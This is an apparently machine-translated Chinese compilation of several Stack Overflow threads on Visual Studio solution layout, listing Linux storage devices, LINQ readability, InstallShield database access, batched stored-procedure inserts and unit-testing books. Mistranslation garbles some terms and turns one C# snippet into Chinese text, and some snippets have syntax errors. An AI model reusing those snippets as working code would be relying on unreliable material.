通常，多个应用程序共享大量库代码库，这些库在开发过程中经常发生变化。在这些情况下，我更喜欢创建一个以套件命名的解决方案，并为每个应用程序和共享库包含单独的项目。

这是一个好方法吗？其他人如何为诸如一套应用程序之类的东西构建他们的代码库？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2008-10-14T13:01:43.490

这实际上取决于您组织的特定需求。MSDN 有一个[很好的页面](http://msdn.microsoft.com/en-us/library/ee817674.aspx)，介绍了各种推荐的解决方案布局，包括：

1.  单一解决方案模型（首选）
2.  分区单一解决方案模型
3.  多解决方案模型（仅在绝对必要时）

[MSDN 页面](http://msdn.microsoft.com/en-us/library/ee817674.aspx)还更详细地讨论了每种模型的优缺点，以便您决定哪一种对您有意义。:)

一般来说，对于您描述的应用程序套件，我会考虑分区的单一解决方案模型。有一个构建所有内容的主解决方案，以及用于套件中每个单独应用程序的多个单独的解决方案（假设应用程序具有可观的大小）。

如果套件中的应用程序很小且构建速度很快（例如，一套命令行工具），我什至可能不会生成单独的解决方案文件。这真的是我们无法为您做出的判断。:)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-14T12:47:52.737

您的解决方案的实际结构实际上取决于内部工作流程。拥有一种非常敏捷、**每个人都重构一切的方法**将指向**一个**包含许多项目的解决方案。如果您的商店有**专门的库团队**和各种应用程序团队，他们定期进行内部发布，那么**单独的解决方案**可能有助于通过更强的解耦和**减少构建时间**。

# linux - 查找连接到 Linux 机器的所有存储设备

> ID：200960
> 
> 赞同：112
> 
> 时间：2008-10-14T12:33:40.440
> 
> 标签：linux, bash, shell

我需要找到连接到给定机器的所有可写存储设备，**无论**它们是否已安装。

这样做的愚蠢方法是*尝试*`/dev`对应于可写设备（ ）的每个条目`hd* and sd*`......

有没有更好的解决方案，还是我应该坚持这个？

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2008-10-14T13:11:17.010

`/proc/partitions`将列出系统识别的所有块设备和分区。然后，您可以尝试使用`file -s <device>`来确定分区上存在哪种文件系统（如果有）。

* * *

## 回答 #2

> 赞同：73
> 
> 时间：2011-12-21T19:19:21.753

`fdisk -l`即使在奇怪的设置（例如 EC2 xvda 设备）上，您也总是可以做到这一点。

这是 m1.large 实例的转储：

```
root@ip-10-126-247-82:~# fdisk -l

Disk /dev/xvda1: 10.7 GB, 10737418240 bytes
255 heads, 63 sectors/track, 1305 cylinders, total 20971520 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00000000

Disk /dev/xvda1 doesn't contain a valid partition table

Disk /dev/xvda2: 365.0 GB, 365041287168 bytes
255 heads, 63 sectors/track, 44380 cylinders, total 712971264 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00000000

Disk /dev/xvda2 doesn't contain a valid partition table

Disk /dev/xvda3: 939 MB, 939524096 bytes
255 heads, 63 sectors/track, 114 cylinders, total 1835008 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00000000

Disk /dev/xvda3 doesn't contain a valid partition table 
```

虽然`mount`说：

```
root@ip-10-126-247-82:~# mount
/dev/xvda1 on / type ext4 (rw)
proc on /proc type proc (rw,noexec,nosuid,nodev)
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
fusectl on /sys/fs/fuse/connections type fusectl (rw)
none on /sys/kernel/debug type debugfs (rw)
none on /sys/kernel/security type securityfs (rw)
udev on /dev type devtmpfs (rw,mode=0755)
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
none on /run/shm type tmpfs (rw,nosuid,nodev)
/dev/xvda2 on /mnt type ext3 (rw) 
```

并`/proc/partitions`说：

```
root@ip-10-126-247-82:~# cat /proc/partitions
major minor  #blocks  name

 202        1   10485760 xvda1
 202        2  356485632 xvda2
 202        3     917504 xvda3 
```

# 边注

`fdisk -l`我很想知道自己是如何工作的。

* * *

## 回答 #3

> 赞同：35
> 
> 时间：2012-06-16T14:12:50.933

您也可以尝试**lsblk** ...在 util-linux 中 ...但我也有一个问题

```
fdisk -l /dev/sdl 
```

没有结果

```
grep sdl /proc/partitions      
   8      176   15632384 sdl
   8      177   15628288 sdl1

lsblk | grep sdl
sdl       8:176  1  14.9G  0 disk  
`-sdl1    8:177  1  14.9G  0 part 
```

fdisk 很好但不是那么好......似乎它无法“看到”一切

在我的特定示例中，我有一个内置读卡器的棒，我只能看到使用 fdisk 的棒：

```
fdisk -l /dev/sdk

Disk /dev/sdk: 15.9 GB, 15931539456 bytes
255 heads, 63 sectors/track, 1936 cylinders, total 31116288 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0xbe24be24

   Device Boot      Start         End      Blocks   Id  System
/dev/sdk1   *        8192    31116287    15554048    c  W95 FAT32 (LBA) 
```

但不是卡（卡是 /dev/sdl）

此外，文件 -s 效率低下......

```
file -s /dev/sdl1
/dev/sdl1: sticky x86 boot sector, code offset 0x52, OEM-ID "NTFS    ", sectors/cluster 8, reserved sectors 0, Media descriptor 0xf8, heads 255, hidden sectors 8192, dos < 4.0 BootSector (0x0) 
```

很好……但是

```
fdisk -l /dev/sdb
/dev/sdb1            2048   156301487    78149720   fd  Linux raid autodetect
/dev/sdb2       156301488   160086527     1892520   82  Linux swap / Solaris

file -s /dev/sdb1
/dev/sdb1: sticky \0 
```

要查看有关 fdisk 无法访问的磁盘的信息，可以使用 parted：

```
parted /dev/sdl print

Model: Mass Storage Device (scsi)
Disk /dev/sdl: 16.0GB
Sector size (logical/physical): 512B/512B
Partition Table: msdos

Number  Start   End     Size    Type     File system  Flags
 1      4194kB  16.0GB  16.0GB  primary  ntfs

arted /dev/sdb print 
Model: ATA Maxtor 6Y080P0 (scsi)
Disk /dev/sdb: 82.0GB
Sector size (logical/physical): 512B/512B
Partition Table: msdos

Number  Start   End     Size    Type     File system     Flags
 1      1049kB  80.0GB  80.0GB  primary                  raid
 2      80.0GB  82.0GB  1938MB  primary  linux-swap(v1) 
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2008-10-14T12:45:56.203

`ls /sys/block`

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2008-10-14T13:48:19.183

使用 HAL（内核 2.6.17 及更高版本）：

```
 #! /bin/bash
hal-find-by-property --key volume.fsusage --string filesystem |
while read udi ; do
    # ignore optical discs
    if [[ "$(hal-get-property --udi $udi --key volume.is_disc)" == "false" ]]; then
        dev=$(hal-get-property --udi $udi --key block.device)   
        fs=$(hal-get-property --udi $udi --key volume.fstype) 
        echo $dev": "$fs
    fi 
done 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-10-14T12:42:13.810

现代 linux 系统通常只会在 /dev 中包含现有设备的条目，因此按照您的建议通过 hda* 和 sda* 会很好地工作。

否则，您可以使用 /proc 中的某些内容。从那里快速浏览一下，我会说 /proc/partitions 看起来可以满足您的需求。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-14T12:47:37.730

libsysfs 看起来确实很有用，但不是直接来自 shell 脚本。它附带了一个名为 systool 的程序，它可以执行您想要的操作，尽管直接查看 /sys 可能比使用另一个程序为您执行此操作更容易。

# c# - 什么更具可读性？

> ID：200966
> 
> 赞同：6
> 
> 时间：2008-10-14T12:35:40.717
> 
> 标签：c#, linq, lambda, readability

我有这两段代码，哪一个更易读？

1.  前锋

    ```
    decimal technicalPremium = 0;
    foreach (Risk risk in risks)
    {
         technicalPremium = technicalPremium + risk.TechnicalPremium;
    }
    return technicalPremium; 
    ```

2.  林克

    ```
    return risks.Sum(risk => risk.TechnicalPremium); 
    ```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-10-14T12:38:16.640

如果编写代码的团队知道 Linq 版本做了什么并且知道它的内部工作原理，那么它就更具可读性。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2008-10-14T13:34:18.430

使用您喜欢的任何一个，但将其隐藏在一个方法中：

```
return risks.SumTechnicalPremium(); 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2008-10-14T12:43:56.553

两者都不。第一个比较冗长，可能每个人都能理解。第二个更简洁，即使对linq有一点了解的人也很容易理解。

我想说你可以根据你所处的环境做出选择。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-14T12:39:11.117

对于可以阅读 LINQ 的人来说，LINQ 一。

对于必须逐步解释代码的人（通过使用较短的智能感知/文档。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-14T12:44:44.413

与linq一起去。如果你认为它需要解释，一行注释会解决这个问题。随着人们越来越习惯于 linq，对评论的需求将会消失。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-14T12:40:26.340

LINQ 代码既可读又自记录。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-14T12:49:24.107

第一个选项对更广泛的人来说更具可读性。第二个选项有一个“进入障碍”，因为读者可能知道并理解 LINQ。它更简洁，因此如果您的受众超过了该进入障碍，可能会更好。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-14T12:38:51.303

我认为第二种选择更好，因为它应该更有效。然而，正在发生的事情并不那么明显（至少对我而言）。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-14T12:48:25.170

我会说第一个，因为我不知道 linq。冒着过度记录的风险，我会使用那个对正在发生的事情进行简短描述的文件。或者只是说它对于可能不知道的人来说是 linq。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-14T12:52:08.767

如果您提供解释其目的的评论，那么我会选择 Linq 选项。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-14T12:56:04.250

第一个，如果您不了解 Linq。任何开发人员都可以阅读和理解第一个。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-14T13:02:09.167

这里没有可读性问题。单击总和并按 F1。

林克为胜利。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-10-14T13:16:05.393

每种语言都有编写此类代码的最佳方式的约定，因此对于经常使用该语言的人来说，最易读的东西并不是通用的。对于 Java 或普通 C# 程序员来说，第一个选项更具可读性。对于习惯于 LINQ 或函数式编程的人来说，第二个更具可读性。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-10-14T13:52:03.357

我不知道 c#，但第二种选择对我来说看起来更干净，我可以理解它的作用（好的，与第一个版本进行一些猜测和交叉检查）。可能是因为一些功能背景。但首先，您必须在 4(!) 个地方寻找技术溢价。如果您只是阅读代码，则第二个更短且更容易理解。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2008-10-14T13:54:09.797

**或者**

十进制技术溢价 = 0;

foreach (风险中的风险) TechnicalPremium = TechnicalPremium + risk.TechnicalPremium;

返回技术溢价；

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-10-14T15:02:40.390

我看到人们说他们喜欢第一个“如果你不知道 Linq”。是的，如果你不懂 C#，第一个是不可读的。这不是“哪个更具可读性”的问题，而是“我们使用哪种语言功能更舒服？”的问题。

首先与您的团队就每个人讨厌的语言/框架/工具集的部分进行对话，并宣布它们禁止使用。其他一切都被认为是标准词汇的一部分，每个人都应该流利。这个列表应该放在你的编码标准文档中，就在“[从不制作可变值类型](https://stackoverflow.com/questions/161432/best-algorithm-for-synchronizing-two-ilist-in-c-20#161441)”和“[不要为非公共成员的琐碎属性烦恼](http://blogs.msdn.com/jaybaz_ms/archive/2004/04/29/123333.aspx)”旁边。

只要 Linq 不在您的“排除”列表中，第二个示例就*比*第一个示例更具可读性。为什么？因为它声明了代码的意图，而不是仅仅呈现给读者破译的机制。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2008-10-14T15:04:02.353

如果您的目标是使其对可能出现在您之后的“任何人”更具可读性，请使用 foreach。我将“更具可读性”解释为任何具有语言基础经验的人都应该能够掌握。对于不熟悉 linq 并且仍在使用 VS2005 或更早版本的人来说，linq 语法会令人困惑。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2008-10-14T15:24:09.223

我会说第一段代码肯定更具可读性，如果您至少重命名变量 risk 使其具有与类不同的名称，它将更具可读性。如果您重命名数组风险，可能也会更好。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2008-10-14T16:29:16.567

我同意那些说随着 Linq 被更广泛地采用第二个将很容易理解的人的观点。它当然更简洁。

但是，我对调试的难易程度有些担心。单步执行 foreach 中的代码似乎要容易得多，以准确查看它在每次传递中所做的事情。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2008-10-14T16:43:01.063

我认为这取决于您所说的“可读”是什么意思。第一个例子清楚地表明了程序逻辑，任何有编程背景的人都应该可以理解。

对我来说，第二个示例基于上下文更直观（即，您正在获取一个数组（或其他一些集合类型）并在该数组的每个元素上执行一个名为 Sum 的方法）。第二个示例可能变得不太清楚的唯一地方是实际的 lambda 表达式本身，特别是对于那些没有 lambda 经验或已经有函数式编程背景的人。

我认为随着 lambda 在 .NET 编程中变得越来越普遍，这将不再是一个问题。就目前而言，我认为了解如何在 .NET 中使用 lambda 表达式的基础知识需要一个非常小的学习曲线。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2008-10-21T04:14:21.367

第二个，肯定的。有这么大的代码块来做像求和这样简单的事情是没有必要的。我也不知道 LINQ 是什么，但它对我来说是完全可读的。

# sql - InstallShield 2008 使用什么来处理数据库？

> ID：200976
> 
> 赞同：1
> 
> 时间：2008-10-14T12:38:36.127
> 
> 标签：sql, installshield

我正在使用 Installshield 2008 Developer Edition，需要针对现有的 SQL Server 2005 Express 运行 SQL 脚本。当我在没有 InstallShield 的情况下执行此操作时，例如，我必须安装一些 ODBC 驱动程序。

InstallShield 如何做到这一点？它是否包括某种驱动程序？还是依赖于预先存在的驱动程序？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-15T04:57:40.143

如果您在安装过程中通过 Installshield 安装数据库，Installshield 拥有所有信息，只需使用如下连接字符串：

“驱动程序={SQL Native Client}；服务器=本地主机；数据库=新数据库；Uid=proguser；密码=progpass；”

无需创建 ODBC 连接即可使用这样的连接字符串，Installshield 使 SQL Native Client 成为 SQL 2005 连接数据库的先决条件，因此可以确保有正确的驱动程序可用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-11-05T01:39:09.070

InstallShield 内置了对 SQL 连接/脚本的支持，无需滚动自定义代码。内置自定义操作使用非托管 ADO，特别是一个属性公开要使用的网络库：

IS_SQLSERVER_NETLIB_MS -> 网络库=DBMSSOCN

有关详细信息，请参阅[http://support.microsoft.com/kb/238949](http://support.microsoft.com/kb/238949)

# c# - C#-SQL：如何执行一批StoredProcedure？

> ID：200986
> 
> 赞同：1
> 
> 时间：2008-10-14T12:40:36.747
> 
> 标签：c#, performance, stored-procedures, batch-file, sqlcommand

*编辑：
我的问题不再是问题了：我重做了我的性能测试，我犯了一个致命的愚蠢错误：我忘记了 x1000 从毫秒中获取秒数：/ 对不起那些家伙。
有关信息：
- 我每秒从我的 PC 到本地网络上的数据库服务器进行大约 1900 次更新。
- 如果程序与 DB 在同一台机器上，则每秒更新 3.200 次。
- 每秒 3.500 次从我的 PC 上的数据库服务器更新我不重新创建和重新打开新的 SQLConnection。
- 每秒 5.800 次更新，带有批处理文本。对于我的 10.000 行，如果需要 5 秒，我的程序就可以了。很抱歉让您担心了。*

实际上，我使用 SQL 存储过程在我的数据库中创建一行以避免 SQL 注入。在 C# 中，我有以下方法：

```
public void InsertUser(string userCode)
{
   using (SqlConnection sqlConnection = new SqlConnection(this.connectionString))
   {
      SqlCommand sqlCommand = new SqlCommand("InsertUser", sqlConnection);
      sqlCommand.CommandType = System.Data.CommandType.StoredProcedure;
      sqlCommand.Parameters.Add(new SqlParameter("@UserCode", userCode));
      sqlConnection.Open();
      sqlCommand.ExecuteNonQuery();///0.2 seconds !ERROR HERE! 0.2ms here,NOT 0.2sec!!!
   }
} 
```

当我要插入一两行时，它会很棒。但如果我需要创建 1.000 个用户、10.000 个产品和 5000 个宠物，这不是最好的解决方案：我将在网络传输中浪费大量时间。

我相信，如果不检查它，我可以只使用有限数量的回调。所以我不想调用 10.000 次：

```
sqlCommand.BeginExecuteNonQuery() 
```

另一种方法是创建批处理文本，但存在 SQL 注入风险（而且很丑陋）。

.Net 中是否有管理它的“SqlCommandList”对象？如何在数据库中进行大量写入？那有什么好的模式呢？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-14T12:56:30.800

这应该运行得更快一点：

```
public void InsertUser(IEnumerable<string> userCodes)
{
   using (SqlConnection sqlConnection = new SqlConnection(this.connectionString), 
             SqlCommand sqlCommand = new SqlCommand("InsertUser", sqlConnection))
   {
      sqlCommand.CommandType = System.Data.CommandType.StoredProcedure;
      SqlParameter param = sqlCommand.Parameters.Add("@UserCode", SqlDbTypes.VarChar);
      sqlConnection.Open();

      foreach(string code in userCodes)
      {
          param.Value = code;
          sqlCommand.ExecuteNonQuery();///0.2 seconds
      }
   }
} 
```

这只会打开一个连接并且只创建一个命令，即使你传递了 1000 个用户。不过，它仍然会单独执行每个插入操作。当然，如果 userCode 不是字符串，您需要适当地重新考虑它。您可能还想查看 SQL Server 的[BULK INSERT](http://msdn.microsoft.com/en-us/library/ms188365.aspx)命令。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-14T18:44:11.817

SQLDataAdaptor 的 UpdateBatchSize 怎么样？

我们的前端人员使用它来将几 10,000 个 proc 调用批处理成块

[文章](http://www.dotnetspider.com/resources/4467-Multiple-Inserts-Single-Round-trip-using-ADO-NE.aspx)

[MSDN](http://msdn.microsoft.com/en-us/library/kbbwt18a(VS.80).aspx)

我们的环境不允许“bulkadmin”权限，所以我们不能使用 BULKINSERT/bcp 等

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T13:13:35.353

Based off Joel's answer, this is the fastest solution short of using either SqlBulkCopy or creating big strings of messy SQL and executing. (I added a transaction which will improve performance quite a lot)

```
public void InsertUser(IEnumerabler<string> userCodes)
{
   using (SqlConnection sqlConnection = new SqlConnection(this.connectionString))
   {
      sqlConnection.Open();
      SqlTransaction transaction = connection.BeginTransaction();
      SqlCommand sqlCommand = new SqlCommand("InsertUser", sqlConnection);
      sqlCommand.Transaction = transaction;
      sqlCommand.CommandType = System.Data.CommandType.StoredProcedure;
      SqlParameter param = sqlCommand.Parameters.Add("@UserCode", SqlDbTypes.VarChar);

      foreach(string code in userCodes)
      {
          param.Value = code;
          sqlCommand.ExecuteNonQuery();
      }      
      transaction.Commit();
   }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T12:46:24.457

就个人而言，如果我经常期望进行相当大的插入（10,000 行肯定符合条件...），我可能会考虑为传入数据创建一个单独的表，并使用它[`SqlBulkCopy`](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlbulkcopy.aspx)来填充此表。然后，您只需执行一个将数据移动到真实表中的存储过程。

另一种方法是将 xml 发送到数据库，并使用 sqlxml 来解析它（使用 SQL2005 及更高版本更容易）——但这会给 db 服务器带来额外的工作。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-14T12:58:35.460

如果您真的担心这一点，您可以（如您所说）将命令批处理成字符串，如下所示：

```
var cmd = new SqlCommand();
cmd.Connection = sqlConnection;
for (int i = 0; i < batchSize; i++) {
    cmd.CommandText += String.Format("EXEC InsertUser @UserCode{0};", i);
    cmd.Parameters.AddWithValue("@UserCode" + i.ToString(), XXXXX);
    //... etc ...
} 
```

因为在这个方案中，您将使用一个参数，所以与使用存储过程相比，您不会有更多的 SQL 注入风险。但我怀疑您是否真的会节省大量时间。IMO，您应该保持简单，并按照您现在的方式进行操作。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2011-12-12T18:11:27.863

我猜这是一个很老的问题。

对于 SQL Server 2008，现在的答案是使用表值参数。简而言之，以使用的定义类型（表）传递所有变量。

在 SQL 中，您现在可以将所有记录作为单独的项目来处理......实际上使用集合逻辑并获得真正的性能。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-14T12:45:38.747

您是否考虑过将 XML 文档传递给存储过程，然后遍历该存储过程以查找要插入的数据？

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-14T12:56:20.053

“这不是最好的解决方案：我将在网络传输中损失大量时间” 你能忍受损失吗？

如果这是你不经常做的事情，那有关系吗？首先测量它，如果它是一个问题然后修复它，我个人可能会使用 Marc Gravells 表进行传入插入。另一种选择是异步触发插入，然后在开始下一个之前不要等待每个完成。

我花了好几年的时间，但最后我发现我不应该浪费时间优化不需要它的代码。

希望这会有所帮助（尽管我认为不会，抱歉）。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-14T13:32:54.783

根据上面的一些答案，最显着的性能提升涉及到对现有代码的 2 处更改：

1.  在事务中包装更新
2.  仅打开一个连接并使用不同的参数多次调用该过程。

BULK INSERTs 是一种选择，但对于您想要做的事情可能有点矫枉过正。

# c# - 关于单元测试的好资源？

> ID：200997
> 
> 赞同：5
> 
> 时间：2008-10-14T12:44:37.703
> 
> 标签：c#, unit-testing, mocking

有没有什么好的书或材料可以深入介绍使用模拟进行 C# 单元测试？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-14T12:50:38.207

[单元测试的艺术](http://www.manning.com/osherove/)怎么样。这是 .NET 特定的，应该是最新的。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-14T12:52:05.507

有一本相当不错的书描述了如何使用**NUnit**和**NMock**进行 C# 单元测试：

[C# 中的实用单元测试](https://rads.stackoverflow.com/amzn/click/com/0977616673)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T12:52:34.147

nmock 网站上有很多文档：

[http://www.nmock.org/tutorial.html](http://www.nmock.org/tutorial.html) [http://www.nmock.org/advanced.html](http://www.nmock.org/advanced.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-03-05T18:45:52.377

还有一个视频课程 [http://www.udemy.com/tdd-in-net-with-roy-osherove?from=aout](http://www.udemy.com/tdd-in-net-with-roy-osherove?from=aout)

Roy Osherove 的 .NET 中的 TDD 大师班
超过 14 个讲座和 9.5 小时的内容！79 美元

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-20T14:17:21.493

[C# 中的 Extreme Programming Adventures](http://www.microsoft.com/MSPress/books/6777.aspx)评价很高，并且处理模拟对象。它可能有点过时（当前版本是 2004 年）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T16:26:52.593

我发现 Stephen Walter 的以下文章（尤其是第一篇）非常有用。

[http://weblogs.asp.net/stephenwalther/archive/2008/06/11/tdd-introduction-to-moq.aspx](http://weblogs.asp.net/stephenwalther/archive/2008/06/11/tdd-introduction-to-moq.aspx) [http://weblogs.asp.net/stephenwalther/archive/2008/03/22/tdd -introduction-to-rhino-mocks.aspx](http://weblogs.asp.net/stephenwalther/archive/2008/03/22/tdd-introduction-to-rhino-mocks.aspx) [http://weblogs.asp.net/stephenwalther/archive/2008/03/16/tdd-introduction-to-typemock-isolator.aspx](http://weblogs.asp.net/stephenwalther/archive/2008/03/16/tdd-introduction-to-typemock-isolator.aspx)**************